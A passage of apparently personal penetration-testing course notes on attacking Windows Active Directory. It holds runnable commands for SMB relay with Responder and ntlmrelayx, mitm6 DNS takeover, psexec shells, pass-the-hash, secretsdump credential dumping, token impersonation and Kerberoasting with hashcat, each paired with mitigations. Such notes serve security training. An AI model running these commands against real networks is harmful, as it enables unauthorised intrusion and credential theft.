</code></pre><p id="c9ab613b-f9db-4088-9a48-8962aaa58609" class=""><strong>With interactive shell</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4abef6d9-5103-496b-b0d3-7a4904a0245e" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">responder -I eth0 -rdw
python ntlmrelayx.py -tf target.txt -smb2support -i
# trigger the event connecting in our kali IP
# Get the port of smb client shell in ntlmrelayx tab

nc 127.0.0.1 &lt;port&gt;
# we got a smb shell
# help to show options

# in ntmlrelayx
# -e = execute some program, msfvenom \for example
# -c = command, &quot;whoami&quot;, &quot;dir&quot;, &quot;reverse shell whatever&quot; etc

</code></pre><h3 id="5c80508a-8c94-48db-9b73-47731ad1b438" class=""><strong>Mitigation - SMB Relay</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#mitigation---smb-relay"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="fd3413e2-2b65-4dcb-876c-61c4a7455223" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"># Enable SMB signing on all devices
# Disable NTLM authentication on network
# Account tiering - limits domain admin to specifc tasks
# Local admin restriction

</code></pre><h3 id="fd26040c-2052-4016-a456-c8c5f9ac67fc" class=""><strong>Gaining Shell Access</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#gaining-shell-access"></a></strong></h3><h3 id="07d1ef5a-2ac8-45b9-80a3-ede762efef26" class=""><strong>Metasploit</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#metasploit"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="31ff38f6-02bf-4984-b45c-9ee36c09d3e9" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">search psexec
  use exploit - t/windows/smb/psexec
  or exploit/windows/smb/psexec_psh
</code></pre><h3 id="a79e9573-d6f3-435c-a0d5-909a74035f2a" class=""><strong>psexec.py</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#psexecpy"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="fd84fd6a-5536-467b-9c10-871f9bd16063" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">psexec.py &lt;domain/user:password@target ip&gt;
# example: psexec.py mk.local/subzero:Password3@172.16.127.130
</code></pre><blockquote id="bcb93992-d509-43fe-a4c4-8bdc63b668b5" class="">We can try use smbexec.py or wmiexec.py with the same syntax</blockquote><h3 id="6f640508-f486-4d8b-92da-8a7a422555b3" class=""><strong>IPv6 DNS Takeover via MITM6</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#ipv6-dns-takeover-via-mitm6"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="dba51bd8-657a-4018-b4a9-16cf485266d8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">mitm6 -d mk.local
# -d &lt;domain&gt;
</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="76310995-7fc3-47fd-915e-090ac32ba3d5" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">ntlmrelayx -6 -t ldaps://172.16.127.129 -wh fakewpad.mk.local -l lootme
# ip = DC
# -l = loot - to dump information
</code></pre><h3 id="ad087592-b582-4f7a-845e-b48088825a4d" class=""><strong>Mitigation</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#mitigation"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="57ea09b3-ab1d-44de-941c-1e99b61e9a21" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- If you do not use IPv6 the safest way to prevent mitm6 is to block DHCPv6 traffic and incoming router advertisements in Windows Firewall via GPO.
- If WPAD is not in use, disable via GPO and disable the WinHttpAutoProxySrc service
- Enable both LDAP signing and LDAP channel binding
- Consider Administrative users to the Protected Users group or marking them as Account is sensitive and can not be delegated, which will prevent any impersonation of that user via delegation.
</code></pre><h3 id="b5cb4ef2-426c-4fb5-8f32-cd807ee549c5" class=""><strong>Attacking AD Strategies and Other vectors</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#attacking-ad-strategies-and-other-vectors"></a></strong></h3><p id="e45fbe20-87ce-4d93-acb9-2f781ccdd7fd" class="">Strategies:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6561e8c2-e6f1-47b9-a931-bf9443513fb7" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Begin the day with &#x27;mitm6&#x27; or &#x27;Responder&#x27;
- Runs scans to generate traffic
- If scans are taking too long, look for websites in scope (http_version)
- Look for default credentials on web logins &gt; printers, jenkins, etc
- Think outside the box
</code></pre><h2 id="ae34c75d-ded9-47dc-81de-d49bdc133e77" class=""><strong>PowerView CheatSheet</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#powerview-cheatsheet"></a></strong></h2><p id="886cf08f-a196-4b51-a17d-cd69db24af71" class="">→ https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993</p><h3 id="817dd7e4-9ca6-4563-a838-94b9119bd247" class=""><strong>PowerView</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#powerview"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b588726-4416-4a1f-840d-07053ad7fc08" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Run PowerView:

powershell -ep bypass
# -ep = ExecutionPolicy
# . .\PowerView.ps1

Commands:
Get-NetDomain
Get-NetDomainController
Get-DomainPolicy
(Get-DomainPolicy).&quot;system access&quot;
Get-NetUser
Get-NetUser | select cn / samaccountname / description / etc
Get-UserProperty
Get-UserProperty -Properties pwdlastset / logonaccount / badpwdcount
Get-NetComputer
Get-NetComputer -FullData | select OperatingSystem
Get-NetGroup -GroupName *admin*
Get-NetGroupMember -GroupName &quot;Domain Admins&quot;
Invoke-ShareFinder
Get-NetGPO | select displayname, whenchanged
</code></pre><h3 id="dfea49ed-993b-4515-8426-05c37f5a68e5" class=""><strong>BloodHound</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#bloodhound"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="109006c5-2c02-471a-bbf5-c899602546f0" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">set neo4j
open bloodhound
Get a data collector to use Invoke-BloodHound
 →  https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
 → https://github.com/BloodHoundAD/SharpHound3
</code></pre><p id="4235d0b6-efa5-448b-b95a-50620049b70d" class="">Pass the data collector to the Windows Machine:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22e2f7c3-e8bc-4280-a77d-935e163508a8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">powershell -ep bypass &gt; . .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain domain.local -ZipFileName file.zip
Send the file: \Downloads\file.zip to Kali
</code></pre><p id="b11dc845-5364-446d-b5a9-9997d93b67d3" class="">Go to BloodHound in Kali:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d67704e1-6e10-4506-845f-3fcf6ef22c09" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Upload Data &gt; the zip file that we generate in the Windows Machine
Enumeration time!
</code></pre><h2 id="4e23190a-44ca-4896-8ac3-463f55299cee" class=""><strong>Post-Compromise Attacks</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#post-compromise-attacks"></a></strong></h2><h3 id="06a3b99d-ad0a-4704-857e-a35c9ad2a20a" class=""><strong>Additional Resources</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#additional-resources"></a></strong></h3><ul id="fb3a81a2-55f0-4ae3-a9c5-c5563b8d0c18" class="bulleted-list"><li style="list-style-type:disc">https://adsecurity.org/</li></ul><ul id="ded79f93-4403-4c95-93ac-a7ac387add39" class="bulleted-list"><li style="list-style-type:disc">http://blog.harmj0y.net/</li></ul><ul id="bfc417bd-00d8-4cd4-b073-be115cc847a8" class="bulleted-list"><li style="list-style-type:disc">https://www.pentesteracademy.com/activedirectorylab</li></ul><h3 id="732c5cbc-b98e-495d-9f87-f3b22476a0a9" class=""><strong>Pass the Password &amp; Pass the Hash</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#pass-the-password--pass-the-hash"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8efee872-d05e-40a2-abe2-353a2d55692d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">crackmapexec smb &lt;ip/CIDR&gt; -u &lt;user&gt; -d &lt;domain&gt; -p &lt;pass&gt;
crackmapexec smb &lt;ip/CIDR&gt; -u &lt;user&gt; -d &lt;domain&gt; -H &lt;hash&gt; --local-auth
# obs: Regarding the SAM hash, we always gonna get the second portion to pass/crack etc
# --sam =try to dump the sam
</code></pre><blockquote id="40cdb1d6-8a18-47cc-bf54-bfb1ab55f171" class="">[To remember] You can pass around NTLM hashes, you can not pass NTLMv2 hashes</blockquote><p id="092bbd83-02a2-4adf-93ea-e55d920a78e7" class="">Pass with psexec:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0750a34a-a254-4a31-8fbd-64ebdf5b7b1e" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">psexec.py &lt;&quot;user&quot;:@ip&gt; -hashes &lt;the whole hash&gt;
</code></pre><p id="e585d746-fa7c-448f-9a90-8df52219d724" class="">Get hashes:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4915608d-04fd-447f-a66e-e45d286bf372" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">secretsdump.py &lt;domain/user:password@target ip&gt;
</code></pre><h3 id="33f6151e-da3f-4b6d-820d-0e98d4b42aeb" class=""><strong>Mitigation - Pass Attacks</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#mitigation---pass-attacks"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f2b33ae2-6d21-471e-8d3b-07843983159d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Avoid re-using local admin password
- Limit who is a local administrator (least privilege)
- Utilize strong passwords
- Privileges Access Management (PAM)
- Automatically rotate passwords
</code></pre><h3 id="1d0ec09f-30f1-4d69-a73b-e49d02340e6f" class=""><strong>Token Impersonation</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#token-impersonation"></a></strong></h3><p id="2716b9b9-f0c3-471c-8822-ccccc7b635e9" class="">Temporary Keys that allow you access to a system</p><p id="9a7ddb63-6778-47a1-9d80-b9a7c551a9d2" class="">2 types:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6754f644-88d4-42a3-801e-1576d7693810" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Delegate: Created \for logging into a machine or RDP.
Impersonate: non-interactive such as attaching a network driver or a domain login script
</code></pre><p id="8202226c-e7b6-4a80-97e3-94014f0bcb8a" class="">In meterpreter:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9137009a-4fb2-4085-92e8-cd188b23d2ff" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">getuid
load incognito
list_tokens -u
impersonate_token &lt;domain\\user&gt;
shell
</code></pre><blockquote id="2b8a1fe4-f173-4247-b7ee-42f7c4890e6e" class="">We can use psexec.py in meterpreter to get the first access, then we can post-attack the token</blockquote><p id="f5337363-fe00-45ab-b704-6162457badc8" class="">rev2self = to comeback to the last access in meterpreter</p><h3 id="88fea20d-f6d3-4f2e-828e-4702b97dbec5" class=""><strong>Mitigation - Token Impersonation</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#mitigation---token-impersonation"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bd0c86e8-f52a-48ff-956d-1c335cc93a34" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Limit user/group token creation permissions
- Account tiering
- Local admin restriction
</code></pre><h3 id="c7179372-d4a6-441a-88f0-debe71d5b60d" class=""><strong>Kerberoasting</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#kerberoasting"></a></strong></h3><p id="339f0768-5910-4292-92c6-3897bcab0dc0" class=""><strong>Overview</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d4e734a2-832d-4354-832e-b579c8550819" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- The user request the TGT from DC by sending his NTLM hash
- The DC answer with the TGT with kerberoasting hash
- When user wanna access any server, the user request the TGS from DC by sending the TGT
- The DC answer with the TGS with the servers account hash

Finally:
The user can access the service by sending the TGS
THe service will answer if thats valid or not
</code></pre><p id="e923af1b-b5be-4f68-9756-163842eabc32" class=""><strong>Attack with impacket</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="eeca8ebf-0018-48ec-8944-709a0b08f570" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">python GetUserSPNs.py &lt;domain/user:password&gt; -dc-ip &lt;ip of DC&gt; -request

# Get the TGS hash
# crack it: hashcat -m 13100 hash.txt rockyou.txt
</code></pre><h3 id="738a7b0b-b2bf-4c07-80c3-7bee0e551cf2" class=""><strong>Mitigation - Keberroasting</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#mitigation---keberroasting"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f26faf88-4b23-461b-aaf7-bbb69cc88bb1" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Strong passwords
- Least privilege
</code></pre><h3 id="8fa5b8f7-8ad9-488b-ba75-3077a8512413" class=""><strong>Group Policy Preferences (GPP) AKA MS14-025</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#group-policy-preferences-gpp-aka-ms14-025"></a></strong></h3><p id="4bcf34ce-d1aa-4c6a-9dad-6f6c5ccc2b5a" class="">To check if the vulnerabilty exists:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e13edfa8-54c9-44bc-a2f8-4dfe8e921c8a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">msf &gt; auxiliary/smb_enum_gpp
